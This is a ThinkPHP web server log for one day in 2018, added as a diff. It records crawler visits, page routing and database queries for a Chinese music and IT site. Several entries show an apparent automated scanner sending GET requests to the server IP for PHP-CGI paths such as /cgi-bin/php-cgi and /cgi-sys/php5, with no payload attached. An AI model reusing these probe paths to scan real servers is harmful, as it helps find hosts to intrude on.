+[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
+  0 => 'audio',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-03-14T17:33:09+08:00 ] 172.16.0.5 220.181.108.157 GET /
+[ log ] www.00it.cn/ [运行时间：0.013784s][吞吐率：72.55req/s] [内存消耗：1,679.26kb] [文件加载：46]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip',
+  'if-none-match' => '"@NULL@"',
+  'accept-language' => 'zh-cn,zh-tw',
+  'user-agent' => 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
+  'connection' => 'close',
+  'host' => 'www.00it.cn',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
+  0 => 'audio',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-03-14T17:49:31+08:00 ] 172.16.0.5 183.57.53.177 GET /
+[ log ] zard-forever.com/ [运行时间：0.014622s][吞吐率：68.39req/s] [内存消耗：1,679.10kb] [文件加载：46]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'Close',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_4 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G35 QQ/6.5.3.410 V1_IPH_SQ_6.5.3_1_APP_A Pixel/750 Core/UIWebView NetType/2G Mem/117',
+  'accept-language' => 'zh-cn',
+  'accept' => '*/*',
+  'accept-encoding' => 'deflate, gzip',
+  'host' => 'zard-forever.com',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
+  0 => 'audio',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-03-14T17:59:05+08:00 ] 172.16.0.5 183.57.53.222 GET /cgi-bin/test.cgi
+[ log ] 123.207.34.110/cgi-bin/test.cgi [运行时间：0.013791s][吞吐率：72.51req/s] [内存消耗：1,356.83kb] [文件加载：40]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'cgi-bin',
+    1 => 'test.cgi',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'Close',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_4 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G35 QQ/6.5.3.410 V1_IPH_SQ_6.5.3_1_APP_A Pixel/750 Core/UIWebView NetType/2G Mem/117',
+  'accept-language' => 'zh-cn',
+  'accept' => '*/*',
+  'accept-encoding' => 'deflate, gzip',
+  'host' => '123.207.34.110',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-03-14T18:19:35+08:00 ] 172.16.0.5 183.136.190.42 GET /index/music/index.html
+[ log ] www.00it.cn/index/music/index.html [运行时间：0.024537s][吞吐率：40.75req/s] [内存消耗：2,726.40kb] [文件加载：58]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'music',
+    2 => 'index',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-language' => 'en-us,en-gb,en;q=0.7,*;q=0.3',
+  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:17.0) Gecko/20100101 Firefox/17.0/Nutch-1.4',
+  'accept-encoding' => 'x-gzip, gzip, deflate',
+  'host' => 'www.00it.cn',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Music->index[ /home/www/WWW/application/index/controller/Music.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/music/index.html [ array (
+  0 => 'nickname',
+  1 => 'value',
+  2 => 'data',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000451s ] mysql:dbname=zard;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `music` [ RunTime:0.000604s ]
+[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `music` LIMIT 1 [ RunTime:0.000109s ]
+[ sql ] [ SQL ] SELECT * FROM `music` ORDER BY issue_time asc LIMIT 0,20 [ RunTime:0.000154s ]
+
+---------------------------------------------------------------
+[ 2018-03-14T18:38:38+08:00 ] 172.16.0.5 183.57.53.197 GET /cgi-bin/php4
+[ log ] 123.207.34.110/cgi-bin/php4 [运行时间：0.011835s][吞吐率：84.49req/s] [内存消耗：1,356.79kb] [文件加载：40]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'cgi-bin',
+    1 => 'php4',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'Close',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_4 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G35 QQ/6.5.3.410 V1_IPH_SQ_6.5.3_1_APP_A Pixel/750 Core/UIWebView NetType/2G Mem/117',
+  'accept-language' => 'zh-cn',
+  'accept' => '*/*',
+  'accept-encoding' => 'deflate, gzip',
+  'host' => '123.207.34.110',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-03-14T18:52:58+08:00 ] 172.16.0.5 43.240.66.46 GET /cgi-bin/php
+[ log ] 123.207.34.110/cgi-bin/php [运行时间：0.012320s][吞吐率：81.17req/s] [内存消耗：1,355.30kb] [文件加载：40]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'cgi-bin',
+    1 => 'php',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => '*/*',
+  'host' => '123.207.34.110',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-03-14T18:52:59+08:00 ] 172.16.0.5 43.240.66.46 GET /cgi-bin/php5
+[ log ] 123.207.34.110/cgi-bin/php5 [运行时间：0.011603s][吞吐率：86.19req/s] [内存消耗：1,355.30kb] [文件加载：40]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'cgi-bin',
+    1 => 'php5',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => '*/*',
+  'host' => '123.207.34.110',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-03-14T18:52:59+08:00 ] 172.16.0.5 43.240.66.46 GET /cgi-bin/php-cgi
+[ log ] 123.207.34.110/cgi-bin/php-cgi [运行时间：0.012008s][吞吐率：83.28req/s] [内存消耗：1,355.34kb] [文件加载：40]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'cgi-bin',
+    1 => 'php-cgi',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => '*/*',
+  'host' => '123.207.34.110',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-03-14T18:53:00+08:00 ] 172.16.0.5 43.240.66.46 GET /cgi-bin/php.cgi
+[ log ] 123.207.34.110/cgi-bin/php.cgi [运行时间：0.011258s][吞吐率：88.83req/s] [内存消耗：1,355.34kb] [文件加载：40]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'cgi-bin',
+    1 => 'php.cgi',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => '*/*',
+  'host' => '123.207.34.110',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-03-14T18:53:00+08:00 ] 172.16.0.5 43.240.66.46 GET /cgi-bin/php4
+[ log ] 123.207.34.110/cgi-bin/php4 [运行时间：0.011259s][吞吐率：88.82req/s] [内存消耗：1,355.30kb] [文件加载：40]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'cgi-bin',
+    1 => 'php4',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => '*/*',
+  'host' => '123.207.34.110',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-03-14T18:53:01+08:00 ] 172.16.0.5 43.240.66.46 GET /cgi-bin/php5-cli
+[ log ] 123.207.34.110/cgi-bin/php5-cli [运行时间：0.012394s][吞吐率：80.68req/s] [内存消耗：1,355.34kb] [文件加载：40]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'cgi-bin',
+    1 => 'php5-cli',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => '*/*',
+  'host' => '123.207.34.110',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-03-14T18:53:02+08:00 ] 172.16.0.5 43.240.66.46 GET /cgi-bin/test.cgi
+[ log ] 123.207.34.110/cgi-bin/test.cgi [运行时间：0.012689s][吞吐率：78.81req/s] [内存消耗：1,355.34kb] [文件加载：40]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'cgi-bin',
+    1 => 'test.cgi',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => '*/*',
+  'host' => '123.207.34.110',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-03-14T18:53:03+08:00 ] 172.16.0.5 43.240.66.46 GET /cgi-sys/php5
+[ log ] 123.207.34.110/cgi-sys/php5 [运行时间：0.011985s][吞吐率：83.44req/s] [内存消耗：1,355.30kb] [文件加载：40]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'cgi-sys',
+    1 => 'php5',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => '*/*',
+  'host' => '123.207.34.110',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-03-14T18:56:18+08:00 ] 172.16.0.5 66.249.65.81 GET /
+[ log ] cx.00it.cn/ [运行时间：0.014199s][吞吐率：70.43req/s] [内存消耗：1,679.37kb] [文件加载：46]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip,deflate,br',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
+  'from' => 'googlebot(at)googlebot.com',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'connection' => 'keep-alive',
+  'host' => 'cx.00it.cn',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
+  0 => 'audio',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-03-14T20:07:13+08:00 ] 172.16.0.5 113.105.18.19 GET /
+[ log ] www.zard-forever.com/ [运行时间：0.014376s][吞吐率：69.56req/s] [内存消耗：1,678.85kb] [文件加载：46]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'www.zard-forever.com',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
+  'accept-language' => 'zh-cn',
+  'accept' => '*/*',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'connection' => 'Keep-Alive',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
+  0 => 'audio',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-03-14T20:28:08+08:00 ] 172.16.0.5 183.136.190.51 GET /
+[ log ] www.00it.cn/ [运行时间：0.014011s][吞吐率：71.37req/s] [内存消耗：1,678.45kb] [文件加载：46]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-language' => 'en-us,en-gb,en;q=0.7,*;q=0.3',
+  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:17.0) Gecko/20100101 Firefox/17.0/Nutch-1.4',
+  'accept-encoding' => 'x-gzip, gzip, deflate',
+  'host' => 'www.00it.cn',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
+  0 => 'audio',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-03-14T20:28:27+08:00 ] 172.16.0.5 178.154.171.74 GET /
+[ log ] www.joy-tee.com/ [运行时间：0.014498s][吞吐率：68.98req/s] [内存消耗：1,678.75kb] [文件加载：46]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip,deflate',
+  'from' => 'support@search.yandex.ru',
+  'user-agent' => 'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
+  'connection' => 'Keep-Alive',
+  'host' => 'www.joy-tee.com',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
+  0 => 'audio',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-03-14T21:05:57+08:00 ] 172.16.0.5 101.226.64.174 GET /cgi-bin/php.cgi
+[ log ] 123.207.34.110/cgi-bin/php.cgi [运行时间：0.013593s][吞吐率：73.57req/s] [内存消耗：1,356.82kb] [文件加载：40]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'cgi-bin',
+    1 => 'php.cgi',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'Close',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_4 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G35 QQ/6.5.3.410 V1_IPH_SQ_6.5.3_1_APP_A Pixel/750 Core/UIWebView NetType/2G Mem/117',
+  'accept-language' => 'zh-cn',
+  'accept' => '*/*',
+  'accept-encoding' => 'deflate, gzip',
+  'host' => '123.207.34.110',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-03-14T21:21:15+08:00 ] 172.16.0.5 183.136.190.55 GET /index/index/friendly_link.html
+[ log ] www.00it.cn/index/index/friendly_link.html [运行时间：0.014423s][吞吐率：69.33req/s] [内存消耗：1,666.20kb] [文件加载：46]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'index',
+    2 => 'friendly_link',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-language' => 'en-us,en-gb,en;q=0.7,*;q=0.3',
+  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:17.0) Gecko/20100101 Firefox/17.0/Nutch-1.4',
+  'accept-encoding' => 'x-gzip, gzip, deflate',
+  'host' => 'www.00it.cn',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->friendly_link[ /home/www/WWW/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/friendly_link.html [ array (
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-03-14T21:23:36+08:00 ] 172.16.0.5 60.191.38.77 GET /
+[ log ] 123.207.34.110:80/ [运行时间：0.014149s][吞吐率：70.68req/s] [内存消耗：1,678.49kb] [文件加载：46]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'keep-alive',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0',
+  'host' => '123.207.34.110:80',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
+  0 => 'audio',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-03-14T21:29:41+08:00 ] 172.16.0.5 183.136.190.51 GET /index/index/call_to_us.html
+[ log ] www.00it.cn/index/index/call_to_us.html [运行时间：0.015153s][吞吐率：65.99req/s] [内存消耗：1,665.39kb] [文件加载：46]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'index',
+    2 => 'call_to_us',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-language' => 'en-us,en-gb,en;q=0.7,*;q=0.3',
+  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:17.0) Gecko/20100101 Firefox/17.0/Nutch-1.4',
+  'accept-encoding' => 'x-gzip, gzip, deflate',
+  'host' => 'www.00it.cn',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->call_to_us[ /home/www/WWW/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/call_to_us.html [ array (
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-03-14T21:30:44+08:00 ] 172.16.0.5 183.136.190.42 GET /index/index/suggestion.html
+[ log ] www.00it.cn/index/index/suggestion.html [运行时间：0.013729s][吞吐率：72.84req/s] [内存消耗：1,665.14kb] [文件加载：46]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'index',
+    2 => 'suggestion',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-language' => 'en-us,en-gb,en;q=0.7,*;q=0.3',
+  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:17.0) Gecko/20100101 Firefox/17.0/Nutch-1.4',
+  'accept-encoding' => 'x-gzip, gzip, deflate',
+  'host' => 'www.00it.cn',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->suggestion[ /home/www/WWW/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/suggestion.html [ array (
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-03-14T21:31:11+08:00 ] 172.16.0.5 183.136.190.55 GET /index/music/index.html
+[ log ] www.00it.cn/index/music/index.html [运行时间：0.023817s][吞吐率：41.99req/s] [内存消耗：2,726.40kb] [文件加载：58]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'music',
+    2 => 'index',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-language' => 'en-us,en-gb,en;q=0.7,*;q=0.3',
+  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:17.0) Gecko/20100101 Firefox/17.0/Nutch-1.4',
+  'accept-encoding' => 'x-gzip, gzip, deflate',
+  'host' => 'www.00it.cn',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Music->index[ /home/www/WWW/application/index/controller/Music.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/music/index.html [ array (
+  0 => 'nickname',
+  1 => 'value',
+  2 => 'data',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000258s ] mysql:dbname=zard;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `music` [ RunTime:0.000575s ]
+[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `music` LIMIT 1 [ RunTime:0.000116s ]
+[ sql ] [ SQL ] SELECT * FROM `music` ORDER BY issue_time asc LIMIT 0,20 [ RunTime:0.000132s ]
+
+---------------------------------------------------------------
+[ 2018-03-14T21:32:09+08:00 ] 172.16.0.5 183.136.190.55 GET /index/login/login.html
+[ log ] www.00it.cn/index/login/login.html [运行时间：0.014369s][吞吐率：69.59req/s] [内存消耗：1,694.17kb] [文件加载：51]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'login',
+    2 => 'login',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-language' => 'en-us,en-gb,en;q=0.7,*;q=0.3',
+  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:17.0) Gecko/20100101 Firefox/17.0/Nutch-1.4',
+  'accept-encoding' => 'x-gzip, gzip, deflate',
+  'host' => 'www.00it.cn',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\index\controller\Login->login[ /home/www/WWW/application/index/controller/Login.php ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2018-03-14T21:37:03+08:00 ] 172.16.0.5 112.90.82.236 GET /
+[ log ] 00it.cn/ [运行时间：0.014192s][吞吐率：70.46req/s] [内存消耗：1,679.06kb] [文件加载：46]
+[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'Close',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_4 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G35 QQ/6.5.3.410 V1_IPH_SQ_6.5.3_1_APP_A Pixel/750 Core/UIWebView NetType/2G Mem/117',
+  'accept-language' => 'zh-cn',
+  'accept' => '*/*',
+  'accept-encoding' => 'deflate, gzip',
+  'host' => '00it.cn',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
+  0 => 'audio',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
